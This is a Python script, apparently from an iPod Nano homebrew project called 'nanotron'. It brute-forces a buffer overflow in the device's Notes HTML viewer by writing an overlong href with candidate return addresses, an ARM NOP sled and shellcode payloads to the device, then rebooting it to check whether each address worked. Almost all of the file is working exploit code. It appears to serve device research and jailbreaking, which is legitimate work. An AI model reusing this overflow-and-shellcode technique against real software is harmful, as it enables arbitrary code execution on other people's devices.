import display
import struct
import time
import os
import config

#You shouldn't need to change these two
FREEZEPAYLOAD = struct.pack("<8I", 0xe3a030d3, 0xe121f003, 0xe3a03000, 0xe3a025f2,
                                   0xe3a010a5, 0xe5821000, 0xe2511001, 0xeafffffd)
CRASHPAYLOAD = struct.pack("<8I", 0xe3a030d3, 0xe121f003, 0xe3a03000, 0xe3a025f2,
                                  0xe3a010a5, 0xe5821000, 0xe51ff004, 0x41414141)

def try_address(nanotron, address, irc = None):
    global FREEZEPAYLOAD, CRASHPAYLOAD
    display.myprint ("Testing %8x..." % address)
    status1 = try_file(nanotron, FREEZEPAYLOAD, address,  irc)
    if status1 == 0:
        display.print_status(address, status1, irc=irc)
        return
    status2 = try_file(nanotron, CRASHPAYLOAD, address,  irc)
    display.print_status(address, status1, status2, irc)

def try_file(nanotron, payload, address, irc = None):
    if not nanotron.is_mounted(): nanotron.disk_mode(irc)
    try:
        writeNote(payload, address, nanotron.IPODPATH)
    except IOError:
        display.myprint("FIXME: read-only mount, rebooting")
        nanotron.disk_mode(irc)
    time.sleep(config.NOTE_WAIT)
    nanotron.reboot(irc)
    time.sleep(config.BOOT_WAIT) 
    nanotron.diskmodecombo(config.DISKMODE_WAIT)
    return nanotron.get_status()
    
def writeNote(payload, addr, path):
  pointer = "00000000%x" % addr
  pointer = "%" + pointer[-2:] + "%" + pointer[-4:-2] + "%" + pointer[-6:-4] + "%" + pointer[-8:-6]
  data = "<a href=\"" + ("A" * 256) + pointer * 64 + "\">a</a>"
  data += struct.pack("<I", 0xe1a01001) * ((4096 - len(data) - len(payload)) / 4) + payload
  #os.system("rm " + path + "/Notes/nanotron.htm")
  outfile = open(path + "/Notes/nanotron.htm", "wb")
  outfile.write(data)
  outfile.close()
